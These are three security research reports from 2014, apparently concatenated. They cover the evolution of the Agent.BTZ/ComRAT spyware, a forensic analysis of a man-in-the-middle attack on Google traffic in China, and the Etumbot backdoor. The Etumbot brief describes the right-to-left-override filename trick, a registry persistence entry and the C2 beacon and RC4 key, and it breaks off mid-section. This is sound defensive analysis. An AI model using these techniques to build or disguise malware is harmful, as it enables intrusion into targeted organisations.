Evolution of sophisticated spyware : from Agent.BTZ to ComRAT .
In November 2014 , the experts of the G DATA SecurityLabs published an article about ComRAT , the Agent.BTZ successor .
We explained that this case is linked to the Uroburos rootkit .
We assume that the actor behind these campaigns uses several different malware strains is order to compromise the targeted infrastructure : Uroburos , a rootkit ; Agent.BTZ/ComRAT , remote administration tools or Linux malware and maybe even more .
We decided to have an even closer look at Agent.BTZ and ComRAT and therefore analyzed the evolution of this RAT , covering seven years of development .
Here is a table with the minimal information about 46 different samples :
MD5 Version Compilation Date b41fbdd02e4d54b4bc28eda99a8c1502 Ch 1.0 Wed Jun 13 07:31:32 2007 UTC 93827a6c77e84ffdd9c793d485d3df6e Ch 1.0 Wed Jun 13 07:31:32 2007 UTC 3e9c7ef54ea3d55d5b53abab4c3e2385 Ch 1.0 Wed Jun 13 07:31:32 2007 UTC b9ed8876ef5a05ba364a9cdbdf4f184d Ch 1.0 Tue Jun 19 12:41:21 2007 UTC d8f98f64687b05a62c81ce9e52dd808d Ch 1.1 Tue Jun 26 08:46:11 2007 UTC 2cf64ff9dad8d64ee9322e390d4f7283 Ch 1.1 Tue Jun 26 08:46:11 2007 UTC 24e679155697bd31b34036a44d4346a7 Ch 1.2wcc Tue Jul 24 12:57:37 2007 UTC 53b8b9f779b1d1d298884d1c21313ab3 Ch 1.2wcc Tue Jul 24 12:57:37 2007 UTC 69ae46fedf3c18ff36fc850e0baa9365 Ch 1.2wcc Tue Jul 24 12:57:37 2007 UTC e05511a84eb345954b94f1e05c78bf22 Ch 1.2 Thu Jul 26 07:20:17 2007 UTC f93ce76f6580d68a95260198b2d6feaa Ch 1.3 Mon Dec 3 14:15:58 2007 UTC db5d1583704b0fb6d1cff0b62a512a7d Ch 1.4 Tue Dec 11 17:36:03 2007 UTC 2b348c225985679f62e50b28bdb74ac9 Ch 1.4 Tue Dec 11 17:36:03 2007 UTC af3f0efbd69905123f7df958cc88dff9 Ch 1.4 Tue Dec 11 17:36:03 2007 UTC e825c4961293ad45883cd52f38695283 Ch 1.5 Thu Mar 27 14:58:15 2008 UTC 2a67b53b7ef7b70763658ca7f60e7005 Ch 1.5 Thu Mar 27 14:58:15 2008 UTC bbf569176ec7ec611d8a000b50cdb754 Ch 1.5 Thu Mar 27 14:58:15 2008 UTC e5c76e67128e48cb0f003c2beee47d1f Ch 1.5 Thu Mar 27 14:58:15 2008 UTC 8e5da63369d20e1d2c530bf806996285 Ch 2.02 Mon May 5 11:27:48 2008 UTC 78d3f074b70788897ae7e20e5137bf47 Ch 2.03 Mon May 12 11:52:31 2008 UTC 986f263ca2c529d5d28bce3c62f858ea Ch 2.03 Thu May 22 10:24:55 2008 UTC 4f732099caf5d21729572cec229f7614 Ch 2.04 Mon Jun 9 17:23:56 2008 UTC 5336c24a3399f522f8e19d9c54a069c6 Ch 2.04 Mon Jun 9 17:23:56 2008 UTC dc1c54751f94b6fdf0b6ecdd64e67701 Ch 2.04 Mon Jun 9 17:23:56 2008 UTC 40335fca60acd05f1428b13a9a3c1228 Ch 2.04 Mon Jun 9 17:23:56 2008 UTC 72663ee9d3efaff959bff4ce25bd37a6 Ch 2.04 Mon Jun 9 17:23:56 2008 UTC 5ef72904221aa4090a262a24714054f0 Ch 2.04 Mon Jun 9 17:23:56 2008 UTC 331eca9c7d9fd9cbe7cd192af09880a3 Ch 2.05 Thu Nov 6 13:21:45 2008 UTC db1156b072d58acdac1aeab9af2160a2 Ch 2.05 Thu Nov 6 13:21:45 2008 UTC 74dbea70bfb15db31bb9f757ed4bb1a0 Ch 2.07 Mon Dec 29 11:37:17 2008 UTC eb928bca5675722c7e9e2b09eec1158a Ch 2.07 Mon Dec 29 11:37:17 2008 UTC 162f415abad9708aa61db8e03bcf2f3c Ch 2.11 Mon Sep 14 13:22:57 2009 UTC 448524fd62dec1151c75b55b86587784 Ch 2.11 Mon Sep 14 15:28:07 2009 UTC 29bb70a40689e9e665d15716519bacfd Ch 2.12 Tue Sep 29 10:28:40 2009 UTC 38d6719d6a266c6cefb8626c57378927 Ch 2.13 Mon Dec 7 14:25:12 2009 UTC 02eda1effde92bdf8462abcf40c4f776 Ch 2.13 Mon Dec 7 14:27:53 2009 UTC 5121ce1f96d74076df1c39748e019f42 Ch 2.14.1 Wed Feb 17 15:14:20 2010 UTC 28dc1ca683d6a14d0d1794a68c477604 Ch 3.00 Tue Jan 31 16:12:25 2012 UTC 40bd7846553550f38e458b8493824cb4 Ch 3.00 Tue Feb 14 10:28:06 2012 UTC ba0c777317461ed57a85ffae277044dc Ch 3.02 Wed Apr 4 16:23:44 2012 UTC b86137fa5a232c614ec5405be4d13b37 Ch 3.10 Tue Dec 18 08:22:43 2012 UTC 7872c1d88fe21d8a85f160a6666c76e8 Ch 3.20 Fri Jun 28 12:16:40 2013 UTC 83a48760e92bf30961b4a943d3095b0a Ch 3.20 Fri Jun 28 12:16:58 2013 UTC 3d65c18d09f47547f85c631ebeeda482 Ch 3.20 Mon Jun 24 10:51:01 2013 UTC ec7e3cfaeaac0401316d66e964be684e Ch 3.25 Thu Feb 6 12:37:44 2014 UTC b407b6e5b4046da226d6e189a67f62ca Ch 3.26 Thu Jan 3 18:03:46 2013 UTC .
Thanks to the versioning , we can deduce that the compilation dates we saw and currently see actually seem to be legit – except for the last known version , in which the author modified the compilation date in order to make the analysis more complex .
We can see that this malware was really active in 2007 and 2008 .
New versions declined in frequency in 2009 and only one new sample was identified in 2010 .
We did not encounter any new sample from 2011 , but the malware appeared back in 2012 , with a new major version .
The RAT ’ s evolution described in ten steps .
To describe the evolution of the development , we decided to compare ten major versions :
Version Ch 1.0 ( 2007-06 ) to Ch 1.5 ( 2008-03 ) Version Ch 1.5 ( 2008-03 ) to Ch 2.03 ( 2008-05 ) Version Ch 2.03 ( 2008-05 ) to Ch 2.11 ( 2009-09 ) Version Ch 2.11 ( 2009-09 ) to Ch 2.14.1 ( 2010-02 ) Version Ch 2.14.1 ( 2010-02 ) to Ch 3.00 ( 2012-01 ) Version Ch 3.00 ( 2012-01 ) to Ch 3.10 ( 2012-12 ) Version Ch 3.10 ( 2012-12 ) to Ch 3.20 ( 2013-06 ) Version Ch 3.20 ( 2013-06 ) to Ch 3.25 ( 2014-02 ) Version Ch 3.25 ( 2014-02 ) to Ch 3.26 ( 2013-01 ; date has been modified ) .
The following chapter will present the main differences between the versions mentioned above .
Here is the resemblance ratio for each version , comparing direct neighbor versions only , created using BinDiff : The biggest code update has occurred between version 2.14.1 and version 3.00 .
The gap matches the absence of samples during two years and this fundamental modification is what we call the death of Agent.BTZ and the birth of ComRAT .
Differences between version Ch 1.0 ( 2007-06 ) to Ch 1.5 ( 2008-03 ) The analyzed samples are :
Ch 1.0 : b41fbdd02e4d54b4bc28eda99a8c1502 Ch 1.5 : bbf569176ec7ec611d8a000b50cdb754 Code similarity : 90 % .
We did not identify strong modification between the two samples .
However , we can notice the following :
The configuration file ( XML ) in version 1.5 is stored in Unicode and not in ASCII anymore ; The two versions implement a mechanism to infect new media connected to the infected system .
The implementation is not exactly the same nor is the log of media infection ; Version 1.5 creates a new event : “ wowmgr_is_load ” .
This event has then been used for years .
Differences between version Ch 1.5 ( 2008-03 ) and Ch 2.03 ( 2008-05 ) The analyzed samples are :
Ch 1.5 : bbf569176ec7ec611d8a000b50cdb754 Ch 2.03 : 78d3f074b70788897ae7e20e5137bf47 Code similarity : 83 % .
In version 2.03 of Agent.BTZ , the authors changed the following : They added obfuscation in order to hide sensitive strings ; The communication protocol was modified in order to include the flag “ .
” we assume that “ CH ” has the same meaning than “ Ch ” before the version number and “ CMD ” is the abbreviation for command ; From now on , the malware supports “ runas ” in order to execute commands as administrator .
This command was implemented by Microsoft in Windows Vista in 2007 .
We assume that the author implemented this feature because several targets switched to this version of Windows in 2008 .
According to an article , version 1.5 was used against the US Pentagon .
We assume that the string obfuscation was performed in order to bypass security measures being capable of detecting an intrusion .
Differences between version Ch 2.03 ( 2008-05 ) and Ch 2.11 ( 2009-09 ) The analyzed samples are :
Ch 2.03 : 78d3f074b70788897ae7e20e5137bf47 Ch 2.11 : 162f415abad9708aa61db8e03bcf2f3c Code similarity : 96 % .
The codes of these two versions are extremely similar to each other , we can only notice small changes :
The author changed the name of several registry keys ( probably to avoid detection by well-known IOC ) ; The name of two exported functions were modified , too : InstallM ( ) becomes AddAtomT ( ) and InstallS ( ) becomes AddAtomS ( ) , probably for the same reason than above .
Differences between version Ch 2.11 ( 2009-09 ) and Ch 2.14.1 ( 2010-02 ) The analyzed samples are :
Ch 2.11 : 162f415abad9708aa61db8e03bcf2f3c Ch 2.14.1 : 5121ce1f96d74076df1c39748e019f42 Code similarity : 98 % .
These codes are really similar to each other , too .
We can notice only two changes :
The author patched several bugs ; Four new exports appear : DllCanUnLoadNow ( ) , DllGetClassObject ( ) , DllRegisterServer ( ) , DllUnregisterServer ( ) .
The four exported libraries show that the malware has started to support the OLE Component Object Model ( COM ) .
This version is the first version able to be registered as a COM object .
Three of the four functions are empty .
The fourth one executes the malware .
Differences between version 2.14.1 ( 2010-02 ) and Ch 3.00 ( 2012-01 ) The analyzed samples are :
Ch 2.14.1 : 5121ce1f96d74076df1c39748e019f42 Ch 3.00 : 28dc1ca683d6a14d0d1794a68c477604 Code similarity : 60 % .
These codes really differ from each other , even if some parts of version 2.14.1 were retained .
Moreover , the developers changed the compiler ; they switched from Visual Studio 6.0 to Visual Studio 9.0/10.0 , which is a strong indicator for the huge differences.Version 3.00 is what the G DATA SecurityLabs experts call ComRAT .
We can say that version 2.14.1 is the last version of Agent.BTZ .
Here are the main differences between Agent.BTZ and ComRAT :
The new malware collects more information about the infected system ( such as drive information , volume information… ) .
The media stick infection mechanism has definitely been removed .
We assume this happened due to the fact that Microsoft has disabled AutoRun for external media .
For the attackers , this infection vector is not interesting anymore .
The malware is injected into every process of the infected machine and the main payload is executed in “ explorer.exe ” as we explained in our article ; The communication channel to the command and control is not the same anymore .
In this new version , the malware uses POST requests with the following pattern : As the malware is injected into every process of the infected system , it creates named pipe in order to handle inter-processes communication .
On several 3.00 samples , the author forgot to remove the compilation path , here are some examples :
c : \projects\ChinckSkx64\Debug\Chinch.pdb c : \projects\ChinckSkx64\Release\libadcodec.pdb C : \projects\ChinckSkx64\x64\Release\libadcodec.pdb E : \old_comp\_Chinch\Chinch\trunk\Debug\Chinch.pdb c : \projects\ChinchSk\Release\libadcodec.pdb .
Thanks to these compilation paths , we assume that the original name of the RAT is “ Chinch ” , which leads us to the assumption that the “ CH ” characters in the version name and in the flag “ .
” stands for “ Chinch ” .
In English , chinch is the word for a small North American bug , Blissus leucopterus .
This word is derived from the Spanish word chinche , meaning pest .
Differences between version 3.00 ( 2012-01 ) and Ch 3.10 ( 2012-12 ) The analyzed samples are :
Ch 3.00 : 28dc1ca683d6a14d0d1794a68c477604 Ch 3.10 : b86137fa5a232c614ec5405be4d13b37 Code similarity : 90 % .
The codes are similar to each other , but the authors added several features :
The malware generates more logs ; The malware has a Mutex handle ; The 3.10 version supports multiple command and control servers .
The last new feature is really interesting : if the compromised targets block a specific command and control server , the malware will continue to work , thanks to two alternative command and control servers .
Differences between version 3.10 ( 2012-12 ) and Ch 3.20 ( 2013-06 ) The analyzed samples are :
Ch 3.10 : b86137fa5a232c614ec5405be4d13b37 Ch 3.20 : 7872c1d88fe21d8a85f160a6666c76e8 Code similarity : 93 % .
The major new feature in the version is the new exports function called InstallW ( ) .
This exported function is used by the dropper to add persistence in the registry and to drop a second file ( as explained in our previous article ) .
Version 3.20 uses the following CLSID in order to hijack COM object : B196B286-BAB4 101A-B69C-00AA00341D07 .
This object is the IConnectionPoint interface .
The CLSID was only used in this version .
We assume that the performed COM object hijacking generates some trouble on the infected system , that ’ s why the author changed related things in the next version .
Furthermore , the CLSID was stored in plain text within the sample .
Differences between version Ch 3.20 ( 2013-06 ) and Ch 3.25 ( 2014-02 ) The analyzed samples are :
Ch 3.20 : 7872c1d88fe21d8a85f160a6666c76e8 Ch 3.25 : ec7e3cfaeaac0401316d66e964be684e Code similarity : 91 % .
In the 3.25 version , the author switched to the CLSID : 42aedc87-2188-41fd-b9a3-0c966feabec1 as described in our article .
Furthermore , the strings in the sample are obfuscated .
The main new feature is the obfuscation – almost all strings are obfuscated and the XML pattern is not written in plain text anymore .
Differences between version Ch 3.25 ( 2014-02 ) and Ch 3.26 ( 2013-01 ; date has been modified ) The analyzed samples are :
Ch 3.25 : ec7e3cfaeaac0401316d66e964be684e Ch 3.26 : b407b6e5b4046da226d6e189a67f62ca Code similarity : 95 % .
The version 3.26 is the latest known version .
In this version :
The authors removed the familiar XOR key used by Agent.BTZ and Uroburos .
We assume that due to the G DATA publication in February 2014 , the author decided to remove as many links as possible between Uroburos and Agent.BTZ/ComRAT/Chinch ; The authors do not generate logs anymore ; The compilation date has been modified , in order to make the analysis and timeline creation more complex .
Conclusion .
This analysis shows us seven years of the evolution of a Remote Administration Tool , used by a group which targeted extremely sensitive entities , such as the US Pentagon in 2008 or the Belgium Ministry of Foreign Affairs in 2014 as well as the Finnish Ministry of Foreign Affairs .
Except for version 3.00 , the modifications made are rather marginal .
We can see that the authors adapted features to the Windows versions , patched bugs , added obfuscation etc… The biggest update was performed to version 3.00 , after two years of silence .
Visibly , this RAT was used alongside the Uroburos rootkit .
Nevertheless , it is not entirely clear how and when the attackers choose to use the RAT or the rootkit or whether both are used in parallel .
Taking everything into consideration , G DATA SecurityLabs experts are sure that the group behind Uroburos/Agent.BTZ/ComRAT/Linux tool/… will remain an active player in the malware and APT field .
The newest revelations made and connections drawn let us believe that there is even more to come .
Analysis of Chinese MITM on Google .
Thursday , 04 September 2014 23:55:00 ( UTC/GMT ) The Chinese are running a MITM attack on SSL encrypted traffic between Chinese universities and Google .
We 've performed technical analysis of the attack , on request from GreatFire.org , and can confirm that it is a real SSL MITM against www.google.com and that it is being performed from within China .
We were contacted by GreatFire.org yesterday ( September 3 ) with a request to analyze two packet captures from suspected MITM-attacks before they finalized their blog post .
The conclusions from our analysis is now published as part of GreatFire.org 's great blog post titled “ Authorities launch man-in-the middle attack on Google ” .
In their blog post GreatFire.org write : From August 28 , 2014 reports appeared on Weibo and Google Plus that users in China trying to access google.com and google.com.hk via CERNET , the country ’ s education network , were receiving warning messages about invalid SSL certificates .
The evidence , which we include later in this post , indicates that this was caused by a man-in-the-middle attack .
While the authorities have been blocking access to most things Google since June 4th , they have kept their hands off of CERNET , China ’ s nationwide education and research network .
However , in the lead up to the new school year , the Chinese authorities launched a man-in-the-middle ( MITM ) attack against Google .
Our network forensic analysis was performed by investigating the following to packet capture files :
Client Capture Capture Location Filename MD5 Netname Date aba4b35cb85ed218 Peking University PKU6-CERNET2 Aug 30 , 2014 google.com.pcap 7a8a7656cd670a93 Chongqing 3bf943ea453f9afa CQU6-CERNET2 Sep 1 , 2014 google_fake.pcapng University 5c06b9c126d79557 .
Client and Server IP adresses .
The analyzed capture files contain pure IPv6 traffic ( CERNET is a IPv6 network ) which made the analysis a bit different then usual .
We do not disclose the client IP addresses for privacy reasons , but they both seem legit ; one from Peking University ( netname PKU6-CERNET2 ) and the other from Chongqing University ( CQU6-CERNET2 ) .
Both IP addresses belong to AS23910 , named `` China Next Generation Internet CERNET2 '' .
Peking University entrance , by galaygobi ( Creative Commons Attribution 2.0 ) .
Chongqing University gate , by Brooktse ( Creative Commons Attribution-Share Alike 3.0 ) .
The IP addresses received for www.google.com were in both cases also legit , so the MITM was n't carried out through DNS spoofing .
The Peking University client connected to 2607 : f8b0:4007:804 : :1013 ( GOOGLE-IPV6 in United States ) and the connection from Chongqing University went to 2404:6800:4005:805 : :1010 ( GOOGLE_IPV6_AP-20080930 in Australia ) .
Time-To-Live ( TTL ) Analysis .
The Time-To-Live ( TTL ) values received in the IP packets from www.google.com were in both cases 248 or 249 ( note : TTL is actually called ” Hop Limit ” in IPv6 nomenclature , but we prefer to use the well established term ” TTL ” anyway ) .
The highest possible TTL value is 255 , this means that the received packets have n't made more than 6 or 7 router hops before ending up at the client .
However , the expected number of router hops between a server on GOOGLE-IPV6 and the client at Peking University is around 14 .
The low number of router hops is is a clear indication of an IP MITM taking place .
CapLoader with both capture files loaded , showing TTL values .
Here is an IPv6 traceroute from AS25795 in Los Angeles towards the IP address at Peking University ( generated with ARP Networks ' 4or6.com tool ) : # traceroute 6 2001 : da8 : [ REDACTED ] 1 2607 : f2f8:1600 : :1 ( 2607 : f2f8:1600 : :1 ) 1.636 ms 1.573 ms 1.557 ms 2 2001:504:13 : :1a ( 2001:504:13 : :1a ) 40.381 ms 40.481 ms 40.565 ms 3 * * * 4 2001:252:0:302 : :1 ( 2001:252:0:302 : :1 ) 148.409 ms 148.501 ms 148.595 ms 5 * * * 6 2001:252:0:1 : :1 ( 2001:252:0:1 : :1 ) 148.273 ms 147.620 ms 147.596 ms 7 pku-bj-v6.cernet2.net ( 2001 : da8:1:1b : :2 ) 147.574 ms 147.619 ms 147.420 ms 8 2001 : da8:1:50d : :2 ( 2001 : da8:1:50d : :2 ) 148.582 ms 148.670 ms 148.979 ms 9 cernet2.net ( 2001 : da8 : ac : ffff : :2 ) 147.963 ms 147.956 ms 147.988 ms 10 2001 : da8 : [ REDACTED ] 147.964 ms 148.035 ms 147.895 ms 11 2001 : da8 : [ REDACTED ] 147.832 ms 147.881 ms 147.836 ms 12 2001 : da8 : [ REDACTED ] 147.809 ms 147.707 ms 147.899 ms As can be seen in the traceroute above , seven hops before the client we find the 2001:252 : :/32 network , which is called “ CNGI International Gateway Network ( CNGIIGN ) ” .
This network is actually part of CERNET , but on AS23911 , which is the network that connects CERNET with its external peers .
A reasonable assumption is therefore that the MITM is carried out on the 2001:252 : :/32 network , or where AS23910 ( 2001 : da8:1 : :2 ) connects to AS23911 ( 2001:252:0:1 : :1 ) .
This means that the MITM attack is being conducted from within China .
Response Time Analysis .
The round-trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server .
The expected round-trip time for connecting from CERNET to a Google server overseas would be around 150ms or more .
However , in the captures we 've analyzed the TCP SYN+ACK package was received in just 8ms ( Peking ) and 52ms ( Chongqing ) respectively .
Again , this is a clear indication of an IP MITM taking place , since Google can not possibly send a response from the US to CERNET within 8ms regardless of how fast they are .
The fast response times also indicate that the machine performing the MITM is located fairly close to the network at Peking University .
Even though the machine performing the MITM was very quick at performing the TCP tree-way handshake we noticed that the application layer communication was terribly slow .
The specification for the TLS handshake ( RFC 2246 ) defines that a ClientHello message should be responded to with a ServerHello .
Google typically send their ServerHello response almost instantly , i.e .
the response is received after one round-trip time ( 150ms in this case ) .
However , in the analyzed captures we noticed ServerHello response times of around 500ms .
X.509 Certificate analysis .
We extracted the X.509 certificates from the two capture files to .cer files using NetworkMiner .
We noticed that both users received identical certificates , which were both self signed for “ google.com ” .
The fact that the MITM used a self signed certificate makes the attack easily detectable even for the non technical user , since the web browser will typically display a warning about the site not being trusted .
Additionally the X.509 certificate was created for ” google.com ” rather than ” * .google.com ” .
This is an obvious miss from the MITM'ers side since they were attempting to MITM traffic to ” www.google.com ” but not to ” google.com ” www.google.comvious miss from the MITM'ers side since they were attempting to MITM traffic to ” www.google.com ” but not to ” google.com ” .
NetworkMiner showing list of X.509 certificates extracted from the two PCAP files .
Certificate SHA1 fingerprint : f6beadb9bc02e0a152d71c318739cdecfc1c085d Certificate MD5 fingerprint : 66 : D5 : D5:6A : E9:28:51:7C:03:53 : C5 : E1:33:14 : A8:3B A copy of the fake certificate is available on Google drive thanks to GreatFire.org .
Conclusions .
All evidence indicates that a MITM attack is being conducted against traffic between China ’ s nationwide education and research network CERNET and www.google.com .
It looks as if the MITM is carried out on a network belonging to AS23911 , which is the outer part of CERNET that peers with all external networks .
This network is located in China , so we can conclude that the MITM was being done within the country .
It 's difficult to say exactly how the MITM attack was carried out , but we can dismiss DNS spoofing as the used method .
The evidence we 've observed instead indicate that the MITM attack is performed either by performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy .
An alternative to changing the router config would also be to add an in-line device that redirects the desired traffic to the SSL proxy .
However , regardless of how they did it the attacker would be able to decrypt and inspect the traffic going to Google .
We can also conclude that the method used to perform the MITM attack was similar to the Chinese MITM on GitHub , but not identical .
Share | .
Short URL : http : //netresec.com/ ? b=14955CB Posted by Erik Hjelmvik on Thursday , 04 September 2014 23:55:00 ( UTC/GMT ) .
Arbor Threat Intelligence Brief 2014-07 .
ASERT Threat Intelligence Brief 2014-07 .
Illuminating the Etumbot APT Backdoor .
ASERT Threat Intelligence , June 2014 Etumbot is a backdoor used in targeted attacks since at least March 2011 .
Although previous research has covered a related family , IXESHE , little has been discussed regarding Etumbot ’ s capabilities .
ASERT has observed several Etumbot samples using decoy documents involving Taiwanese and Japanese topics of interest , indicating the malware is used in ongoing , targeted campaigns .
This report will provide information on the capabilities of Etumbot and associated campaign activity .
Etumbot Capabilities and Techniques .
Etumbot is a backdoor malware that has been associated with a Chinese threat actor group alternatively known as “ NumberedPanda ” , APT12 , DYNCALC/CALCTeam , and IXESHE .
Targeted campaigns attributed to this group include attacks on media , technology companies , and governments .
IXESHE/Numbered Panda is known for using screen saver files ( .scr ) , a technique repeated with the Etumbot malware .
[ 1 ] A previous campaign using IXESHE malware was highlighted in 2012 ; the group used targeted emails with malicious PDF attachments to compromise East Asian governments , Taiwanese electronics manufacturers , and a telecommunications company .
The group has reportedly been active since at least July 2009 .
[ 2 ] Etumbot has also been referred to as Exploz [ 3 ] and Specfix .
The variety of names for this malware could lead to some confusion about the actual threat .
ASERT has associated Etumbot with IXESHE , and therefore Numbered Panda , based on similar system and network artifacts that are common between the malware families .
For example , both malware families have been seen using the same ka4281x3.log and kb71271.log files , both families have been observed calling back to the same Command & Control servers and have been used to target similar victim populations with similar attack methodologies .
Etumbot has two primary components .
The first is a dropper which contains the backdoor binary ( the second component ) and the distraction file .
Stage one is likely delivered via spear phish using an archive file extension such as .7z to deliver executable content .
Stage one has been seen to leverage the Unicode Right to Left Override trick combined with convincing icons for various types of PDFs or Microsoft Office documents to convince the user to click and therefore execute the malware , which then .
© Copyright 2014 Arbor Networks , Inc .
All rights reserved .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
runs the backdoor and displays the distraction file .
As with the IXESHE malware , Etumbot has been observed dropping documents of interest to a Taiwanese and Japanese target population .
Stage 1 : Installer/Dropper .
To profile the techniques and capabilities of Etumbot , we will analyze an Etumbot dropper with MD5 ff5a7a610746ab5492cc6ab284138852 and a compile date of March 4 , 2014 .
When executed , the dropper loads up a resource named `` BINARY '' from the resource section then creates the directory C : \Documents and Settings\User\Application Data\JAVA , then creates a temporary file C : \DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log then creates C : \Documents and Settings\User\Application Data\JAVA\JavaSvc.exe from the aforementioned BINARY resource .
This file , JavaSvc.exe , is the backdoor component ( MD5 82d4850a02375a7447d2d0381b642a72 ) .
JavaSvc.exe is executed with CreateProcessInternalW .
The backdoor component of the malware ( named here as JavaSvc.exe ) is now running .
It is interesting to note that versions of the IXESHE malware also used JavaSvc.exe as a filename .
Most Etumbot samples observed by ASERT drop decoy documents ( PDFs , Word Documents , and Excel Spreadsheets ) written in Traditional Chinese and usually pertaining to Cross-Strait or Taiwanese Government interests .
Several decoy files contain details on upcoming conferences in Taiwan .
Spear Phishing .
Etumbot appears to be sent to targets via spear phishing emails as an archive ; ASERT has observed .7z and .rar formats being used to presumably deliver the Etumbot installer .
The archive filename will have a topic most likely of interest to the victim .
At least one identified malware sample ( 75193fc10145931ec0788d7c88fc8832 , compiled in March 2014 ) uses a password-protected .7z to deliver the Etumbot installer .
It is most likely that the spear phish email contained the password .
With the correct password , the victim has access to the dropper inside the archive .
This archive most likely included the installer d444be30d2773b23de38ead1f2c6d117 , as the filenames match ( 1030522 新 .
2 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
機關籌備小組清單.7z and 1030522 新機關籌備小組清單 rcs.DOC ) .
1030522 is a date ( May 22 , 2014 ) from the Minguo calendar , which is unique to Taiwan .
The calendar is based on the establishment of the rd Republic of China in 1911 .
2014 is therefore the “ 103 ” year of the ROC .
The installer is a .scr binary posing as a Word Document .
This dropper drops a decoy document and the backdoor , named sysupdate.exe in this instance .
Right-to-Left Override After the files are extracted from the archive , the filenames of Etumbot installers make use of the right-to-left override ( RTLO ) trick in an attempt to trick users into clicking on the installer .
The RTLO technique is a simple way for malware writers to disguise names of malicious files .
A hidden Unicode character in the filename will reverse the order of the characters that follow it , so that a .scr binary file appears to be a .xls document , for example .
Threat actors using this trick have been well documented since at least 2009 .
[ 4 5 ] One way to avoid this trick in Windows is to set the “ Change your view ” level to “ Content ” .
[ 6 ] .
Below are some of the names of Etumbot installers using RTLO successfully :
File name Md5 招標規範 Finarcs.doc b3830791b0a397bea2ad943d151f856b 1030522 新機關籌備小組清單 rcs.DOC d444be30d2773b23de38ead1f2c6d117 報價單 Finarcs.xls 5340fcfb3d2fa263c280e9659d13ba93 10342 委會-­‐審 金融法規修正草案報告 rcs.xls beb16ac99642f5c9382686fd8ee73e00 國發會 1030324 第 1 次委員會重要議題通報 finalrcs.xls 4c703a8cfeded7f889872a86fb7c70c f APO EPIF 邀請函 rcs.xls 1ce47f76fca26b94b0b1d74610a734a4 .
Stage 2 : Persistence , Distraction , HTTP Beacon and Crypto Functionality .
As the backdoor executes from our previous example , C : \DOCUME~1\User\LOCALS~1\Temp\ kb71271.log is created and contains the following registry file to make the malware persistent : [ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]"JavaSvc"="C:\\DocumentsandSettings\\User\\ApplicationData\\JAVA\\JavaSvc.exe" The dropper then calls regedit with kb71271.log as a parameter to modify the registry .
kb71271.log is then deleted .
These temp files appear to be static and used across multiple samples of Etumbot and IXESHE .
Various other samples were found using this same naming scheme .
Next , C : \DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log is created , filled with contents of the bait/distraction file , and then copied to C : \DOCUME~1\User\LOCALS~1\Temp\~t3fcj1.doc , which is then opened .
If Word is n't installed , then notepad will open the file instead .
The ka4281x3.log file is then deleted .
Returning to the first sample , once the dropper ( ff5a7a610746ab5492cc6ab284138852 ) installs the Etumbot backdoor ( 82d4850a02375a7447d2d0381b642a72 ) , an initial HTTP beacon is sent to the Command & Control server that requests an RC4 encryption key .
The beacon takes the form of a GET request to /home/index.asp ? typeid=N where N is a randomly selected odd number between 1 and 13 .
If the C & C is online , the decoded response payload will contain the RC4 key that is used to encrypt subsequent communication .
If the C & C does not send a valid response , the bot will re-send the initial request every 45 seconds .
© Copyright 2013 Arbor Networks , Inc .
All rights reserved .
3 .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
While the user-agent may appear to be legitimate , it only occurred 39 times in a corpus of over 61 million HTTP requests .
Due to the possibility of this User-Agent appearing in legitimate traffic , other indicators – such as the additional fake Referer value of http : //www.google.com should be present before compromise is assumed .
All of the headers in the HTTP request are hard-coded in both order and value , so they may be used to provide additional indicators of compromise .
If the C & C is online and responds to the beacon , then the RC4 key is delivered to the bot in a string of base64 encoded characters .
Etumbot uses a url-safe base64 alphabet , i.e. , any characters that would require URL-encoding are replaced .
Usage of base64 is a technique consistent with previous analysis done on IXESHE malware .
[ 2,7 ] In the case of Base64 , the “ / ” and “ = ” characters are replaced with “ _ ” and “ - “ respectively .
The payload from the C & C contains an 8-byte command code in little-endian format , followed by a null-terminated string argument if the command requires it .
In the case of the initial beacon response , the RC4 key is located after the command code and has been observed to be e65wb24n5 for all live C & C ’ s that ASERT has analyzed .
An example of this initial beacon and delivery of RC4 key is as follows .
4 Proprietary and Confidential Information of Arbor Networks , Inc .
Arbor Security Report : ASERT Threat Intelligence Brief 2014-07 .
The RC4 key can be obtained from the C & C response with the following python :
